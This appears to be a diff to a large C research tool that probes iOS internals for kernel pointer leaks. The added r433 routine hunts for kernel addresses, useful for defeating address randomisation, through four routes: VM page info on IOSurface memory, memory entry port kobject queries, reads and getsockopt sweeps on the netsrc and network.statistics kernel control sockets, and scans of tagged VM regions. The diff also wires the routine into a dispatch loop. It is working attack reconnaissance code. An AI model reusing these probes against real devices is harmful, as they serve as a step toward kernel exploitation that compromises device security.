@@ -111,6 +111,12 @@ extern kern_return_t mach_vm_page_info(
 /* kern_control.h not in iOS SDK — declare manually */
 #define CTLIOCGINFO 0xC0644E03
 #define AF_SYS_CONTROL 2
+#ifndef SYSPROTO_CONTROL
+#define SYSPROTO_CONTROL 2
+#endif
+#ifndef PF_SYSTEM
+#define PF_SYSTEM AF_SYSTEM
+#endif
 struct ctl_info {
     uint32_t ctl_id;
     char ctl_name[96];
@@ -16750,6 +16756,299 @@ static void r428_sighandler(int sig) {
  * Also scan the entire IOSurfaceClientRef structure (448 bytes at the
  * surf pointer itself) for any kernel pointers or interesting data.
  */
+
+static void r433_probe(void) {
+    rlog("\n=== r433: VM Page Info + Memory Entry + NetSrc ===\n\n");
+    fflush(stdout);
+
+    /* Vector A: mach_vm_page_info on IOSurface backing store */
+    rlog("  --- Vector A: mach_vm_page_info on IOSurface pages ---\n");
+    {
+        CFMutableDictionaryRef sp = CFDictionaryCreateMutable(NULL, 0,
+            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+        int tw=64, th=64, tbpr=256, tas=16384, tpf=0x42475241;
+        CFNumberRef tn[5];
+        tn[0] = CFNumberCreate(NULL, kCFNumberIntType, &tw);
+        tn[1] = CFNumberCreate(NULL, kCFNumberIntType, &th);
+        tn[2] = CFNumberCreate(NULL, kCFNumberIntType, &tbpr);
+        tn[3] = CFNumberCreate(NULL, kCFNumberIntType, &tas);
+        tn[4] = CFNumberCreate(NULL, kCFNumberIntType, &tpf);
+        CFDictionarySetValue(sp, CFSTR("IOSurfaceWidth"), tn[0]);
+        CFDictionarySetValue(sp, CFSTR("IOSurfaceHeight"), tn[1]);
+        CFDictionarySetValue(sp, CFSTR("IOSurfaceBytesPerRow"), tn[2]);
+        CFDictionarySetValue(sp, CFSTR("IOSurfaceAllocSize"), tn[3]);
+        CFDictionarySetValue(sp, CFSTR("IOSurfacePixelFormat"), tn[4]);
+        IOSurfaceRef surf = IOSurfaceCreate(sp);
+        CFRelease(sp);
+        for (int i = 0; i < 5; i++) CFRelease(tn[i]);
+
+        if (surf) {
+            IOSurfaceLock(surf, 0, NULL);
+            void *base = IOSurfaceGetBaseAddress(surf);
+            size_t allocsz = IOSurfaceGetAllocSize(surf);
+            rlog("    Surface: id=%u base=%p alloc=%zu\n",
+                 IOSurfaceGetID(surf), base, allocsz);
+
+            /* Get page info for each page of the backing store */
+            for (size_t off = 0; off < allocsz; off += 16384) {
+                mach_vm_address_t addr = (mach_vm_address_t)base + off;
+                r415_page_info_t pinfo = {0};
+                mach_msg_type_number_t cnt = sizeof(pinfo) / sizeof(int);
+                kern_return_t kr = mach_vm_page_info(mach_task_self(), addr,
+                    1 /* VM_PAGE_INFO_BASIC */, &pinfo, &cnt);
+                rlog("    page +0x%zx: kr=%d disp=0x%x ref=%d obj_id=0x%016llx off=0x%llx depth=%d\n",
+                     off, kr, pinfo.disposition, pinfo.ref_count,
+                     (unsigned long long)pinfo.object_id,
+                     (unsigned long long)pinfo.offset, pinfo.depth);
+                if ((pinfo.object_id & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL) {
+                    rlog("    *** KPTR in object_id! ***\n");
+                }
+                /* Check if object_id looks like a kernel heap pointer */
+                if (pinfo.object_id > 0x100000000ULL && pinfo.object_id < 0xFFFFFFFFFFFFFFFFULL) {
+                    rlog("    (large object_id — could be kernel address)\n");
+                }
+            }
+
+            /* Also check shared data pages */
+            void *shrp = *(void**)((char*)surf + 8);
+            if (shrp) {
+                r415_page_info_t pinfo = {0};
+                mach_msg_type_number_t cnt = sizeof(pinfo) / sizeof(int);
+                kern_return_t kr = mach_vm_page_info(mach_task_self(),
+                    (mach_vm_address_t)shrp, 1, &pinfo, &cnt);
+                rlog("    shared data page: kr=%d obj_id=0x%016llx off=0x%llx\n",
+                     kr, (unsigned long long)pinfo.object_id,
+                     (unsigned long long)pinfo.offset);
+            }
+
+            IOSurfaceUnlock(surf, 0, NULL);
+
+            /* Vector A2: mach_make_memory_entry_64 on IOSurface pages */
+            rlog("\n    Memory entry from IOSurface:\n");
+            {
+                memory_object_size_t me_size = allocsz;
+                mach_port_t me_port = MACH_PORT_NULL;
+                kern_return_t kr = mach_make_memory_entry_64(mach_task_self(),
+                    &me_size, (memory_object_offset_t)(uintptr_t)base,
+                    VM_PROT_READ | VM_PROT_WRITE, &me_port, MACH_PORT_NULL);
+                rlog("    mach_make_memory_entry_64: kr=%d port=0x%x size=0x%llx\n",
+                     kr, me_port, (unsigned long long)me_size);
+                if (kr == 0 && me_port != MACH_PORT_NULL) {
+                    /* Try kobject on the memory entry port */
+                    natural_t ktype = 0;
+                    mach_vm_address_t kaddr = 0;
+                    kr = mach_port_kobject(mach_task_self(), me_port,
+                        &ktype, (mach_vm_address_t*)&kaddr);
+                    rlog("    kobject(mem_entry): kr=%d type=%u addr=0x%llx\n",
+                         kr, ktype, (unsigned long long)kaddr);
+                    if (kaddr != 0 && (kaddr & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL) {
+                        rlog("    *** KPTR from memory entry kobject! ***\n");
+                    }
+
+                    /* Try mach_port_kernel_object */
+                    unsigned int ktype2 = 0, kaddr2 = 0;
+                    kr = mach_port_kernel_object(mach_task_self(), me_port,
+                        &ktype2, &kaddr2);
+                    rlog("    kernel_object(mem_entry): kr=%d type=%u addr=0x%x\n",
+                         kr, ktype2, kaddr2);
+
+                    mach_port_deallocate(mach_task_self(), me_port);
+                }
+            }
+
+            CFRelease(surf);
+        }
+    }
+    fflush(stdout);
+
+    /* Vector B: netsrc socket data */
+    rlog("\n  --- Vector B: netsrc + network.statistics reads ---\n");
+    {
+        const char *names[] = {"com.apple.netsrc", "com.apple.network.statistics"};
+        for (int n = 0; n < 2; n++) {
+            int fd = socket(PF_SYSTEM, SOCK_DGRAM, 2);
+            if (fd < 0) continue;
+            struct ctl_info ci = {0};
+            strlcpy(ci.ctl_name, names[n], sizeof(ci.ctl_name));
+            if (ioctl(fd, CTLIOCGINFO, &ci) != 0) { close(fd); continue; }
+
+            struct sockaddr_ctl sc = {0};
+            sc.sc_len = sizeof(sc);
+            sc.sc_family = AF_SYSTEM;
+            sc.ss_sysaddr = 2;
+            sc.sc_id = ci.ctl_id;
+            sc.sc_unit = 0;
+            if (connect(fd, (struct sockaddr*)&sc, sizeof(sc)) != 0) { close(fd); continue; }
+
+            rlog("    Connected to '%s' (id=%u)\n", names[n], ci.ctl_id);
+
+            /* Try recv */
+            uint8_t buf[8192] = {0};
+            ssize_t rd = recv(fd, buf, sizeof(buf), MSG_DONTWAIT);
+            rlog("    recv: %zd (errno=%d)\n", rd, errno);
+            if (rd > 0) {
+                uint64_t *qp = (uint64_t*)buf;
+                int kptr_cnt = 0;
+                for (ssize_t i = 0; i < rd / 8; i++) {
+                    if ((qp[i] & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL) {
+                        rlog("      *** KPTR +%zd: 0x%016llx ***\n",
+                             i*8, (unsigned long long)qp[i]);
+                        kptr_cnt++;
+                    }
+                }
+                if (kptr_cnt == 0) {
+                    rlog("      %zd bytes, no kernel pointers\n", rd);
+                    /* Show first few qwords */
+                    for (ssize_t i = 0; i < rd / 8 && i < 8; i++) {
+                        if (qp[i] != 0)
+                            rlog("      +%zd: 0x%016llx\n", i*8, (unsigned long long)qp[i]);
+                    }
+                }
+            }
+
+            /* Try getsockopt to read kernel data */
+            for (int opt = 0; opt < 20; opt++) {
+                uint8_t optbuf[4096] = {0};
+                socklen_t optlen = sizeof(optbuf);
+                int ret = getsockopt(fd, SYSPROTO_CONTROL, opt, optbuf, &optlen);
+                if (ret == 0 && optlen > 0) {
+                    rlog("    getsockopt(%d): %u bytes\n", opt, optlen);
+                    uint64_t *qp2 = (uint64_t*)optbuf;
+                    for (socklen_t i = 0; i < optlen / 8; i++) {
+                        if ((qp2[i] & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL) {
+                            rlog("      *** KPTR opt %d [%u]: 0x%016llx ***\n",
+                                 opt, i, (unsigned long long)qp2[i]);
+                        }
+                    }
+                }
+            }
+
+            close(fd);
+        }
+    }
+    fflush(stdout);
+
+    /* Vector C: Create multiple surfaces, check object_id patterns */
+    rlog("\n  --- Vector C: VM object_id pattern across surfaces ---\n");
+    {
+        IOSurfaceRef surfs[20];
+        for (int i = 0; i < 20; i++) {
+            CFMutableDictionaryRef sp = CFDictionaryCreateMutable(NULL, 0,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            int tw=16, th=16, tbpr=64, tas=4096, tpf=0x42475241;
+            CFNumberRef nw = CFNumberCreate(NULL, kCFNumberIntType, &tw);
+            CFNumberRef nh = CFNumberCreate(NULL, kCFNumberIntType, &th);
+            CFNumberRef nb = CFNumberCreate(NULL, kCFNumberIntType, &tbpr);
+            CFNumberRef na = CFNumberCreate(NULL, kCFNumberIntType, &tas);
+            CFNumberRef nf = CFNumberCreate(NULL, kCFNumberIntType, &tpf);
+            CFDictionarySetValue(sp, CFSTR("IOSurfaceWidth"), nw);
+            CFDictionarySetValue(sp, CFSTR("IOSurfaceHeight"), nh);
+            CFDictionarySetValue(sp, CFSTR("IOSurfaceBytesPerRow"), nb);
+            CFDictionarySetValue(sp, CFSTR("IOSurfaceAllocSize"), na);
+            CFDictionarySetValue(sp, CFSTR("IOSurfacePixelFormat"), nf);
+            surfs[i] = IOSurfaceCreate(sp);
+            CFRelease(sp); CFRelease(nw); CFRelease(nh);
+            CFRelease(nb); CFRelease(na); CFRelease(nf);
+        }
+
+        for (int i = 0; i < 20; i++) {
+            if (!surfs[i]) continue;
+            IOSurfaceLock(surfs[i], 0, NULL);
+            void *base = IOSurfaceGetBaseAddress(surfs[i]);
+            r415_page_info_t pinfo = {0};
+            mach_msg_type_number_t cnt = sizeof(pinfo) / sizeof(int);
+            kern_return_t kr = mach_vm_page_info(mach_task_self(),
+                (mach_vm_address_t)base, 1, &pinfo, &cnt);
+            rlog("    surf[%d] id=%u: obj_id=0x%016llx off=0x%llx ref=%d\n",
+                 i, IOSurfaceGetID(surfs[i]),
+                 (unsigned long long)pinfo.object_id,
+                 (unsigned long long)pinfo.offset, pinfo.ref_count);
+            IOSurfaceUnlock(surfs[i], 0, NULL);
+        }
+
+        /* Check if object_ids form a pattern that reveals kernel heap layout */
+        rlog("    Object ID deltas:\n");
+        uint64_t prev_oid = 0;
+        for (int i = 0; i < 20; i++) {
+            if (!surfs[i]) continue;
+            IOSurfaceLock(surfs[i], kIOSurfaceLockReadOnly, NULL);
+            void *base = IOSurfaceGetBaseAddress(surfs[i]);
+            r415_page_info_t pinfo = {0};
+            mach_msg_type_number_t cnt = sizeof(pinfo) / sizeof(int);
+            mach_vm_page_info(mach_task_self(), (mach_vm_address_t)base, 1, &pinfo, &cnt);
+            if (prev_oid != 0) {
+                int64_t delta = (int64_t)(pinfo.object_id - prev_oid);
+                rlog("      [%d→%d] delta=%lld (0x%llx)\n", i-1, i,
+                     (long long)delta, (unsigned long long)delta);
+            }
+            prev_oid = pinfo.object_id;
+            IOSurfaceUnlock(surfs[i], kIOSurfaceLockReadOnly, NULL);
+        }
+
+        for (int i = 0; i < 20; i++) {
+            if (surfs[i]) CFRelease(surfs[i]);
+        }
+    }
+    fflush(stdout);
+
+    /* Vector D: vm_region_recurse on ALL our mapped regions, check for suspicious tags */
+    rlog("\n  --- Vector D: Full VM region scan for kernel-mapped regions ---\n");
+    {
+        mach_vm_address_t addr = 0;
+        int region_count = 0;
+        int interesting = 0;
+        while (region_count < 500) {
+            mach_vm_size_t rsize = 0;
+            natural_t depth = 1;
+            struct vm_region_submap_info_64 rinfo;
+            mach_msg_type_number_t rcnt = VM_REGION_SUBMAP_INFO_COUNT_64;
+            kern_return_t kr = mach_vm_region_recurse(mach_task_self(), &addr,
+                &rsize, &depth, (vm_region_recurse_info_t)&rinfo, &rcnt);
+            if (kr != 0) break;
+            region_count++;
+
+            /* Check for unusual VM tags (IOKit mapped memory, etc.) */
+            /* Tag 20 = IOKit, Tag 65 = IOSurface */
+            if (rinfo.user_tag == 20 || rinfo.user_tag == 65 ||
+                rinfo.user_tag == 42 || rinfo.user_tag == 43 ||
+                rinfo.user_tag == 70 || rinfo.user_tag == 71 ||
+                (rinfo.user_tag >= 240 && rinfo.user_tag <= 255)) {
+                rlog("    0x%llx-0x%llx sz=0x%llx prot=%d/%d tag=%d\n",
+                     (unsigned long long)addr, (unsigned long long)(addr+rsize),
+                     (unsigned long long)rsize, rinfo.protection, rinfo.max_protection,
+                     rinfo.user_tag);
+                interesting++;
+
+                /* Scan this region for kernel pointers */
+                if (rinfo.protection & VM_PROT_READ) {
+                    vm_offset_t data = 0;
+                    mach_msg_type_number_t dataCnt = 0;
+                    size_t scan = (rsize > 0x10000) ? 0x10000 : (size_t)rsize;
+                    kr = mach_vm_read(mach_task_self(), addr, scan, &data, &dataCnt);
+                    if (kr == 0 && dataCnt > 0) {
+                        uint64_t *dp = (uint64_t*)data;
+                        int kptr_cnt = 0;
+                        for (size_t j = 0; j < dataCnt / 8; j++) {
+                            if ((dp[j] & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL) {
+                                rlog("      *** KPTR +%zu: 0x%016llx ***\n",
+                                     j*8, (unsigned long long)dp[j]);
+                                kptr_cnt++;
+                                if (kptr_cnt >= 5) break;
+                            }
+                        }
+                        mach_vm_deallocate(mach_task_self(), data, dataCnt);
+                    }
+                }
+            }
+            addr += rsize;
+        }
+        rlog("    %d regions scanned, %d interesting\n", region_count, interesting);
+    }
+    fflush(stdout);
+
+    rlog("\n=== r433 complete ===\n");
+    fflush(stdout);
+}
 
 static void r432_probe(void) {
     rlog("\n=== r432: IOConnectTrap + Commpage + NECP + KeyStore Input ===\n\n");
@@ -75002,6 +75301,12 @@ new_modes:
             rlog("*** r=251 complete ***\n");
             goto done;
         }
+        if (rounds == 436) {
+            rlog("*** rounds=436: VM Page Info + Memory Entry + NetSrc ***\n\n");
+            fflush(stdout);
+            r433_probe();
+            goto done;
+        }
         if (rounds == 435) {
             rlog("*** rounds=435: IOConnectTrap + Commpage + NECP + KeyStore ***\n\n");
             fflush(stdout);
@@ -77638,7 +77943,7 @@ new_modes:
             rlog("*** r=252 complete ***\n");
             goto done;
         }
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423 && rounds != 424 && rounds != 425 && rounds != 426 && rounds != 427 && rounds != 428 && rounds != 429 && rounds != 430 && rounds != 431 && rounds != 432 && rounds != 433 && rounds != 434 && rounds != 435) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423 && rounds != 424 && rounds != 425 && rounds != 426 && rounds != 427 && rounds != 428 && rounds != 429 && rounds != 430 && rounds != 431 && rounds != 432 && rounds != 433 && rounds != 434 && rounds != 435 && rounds != 436) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
         }
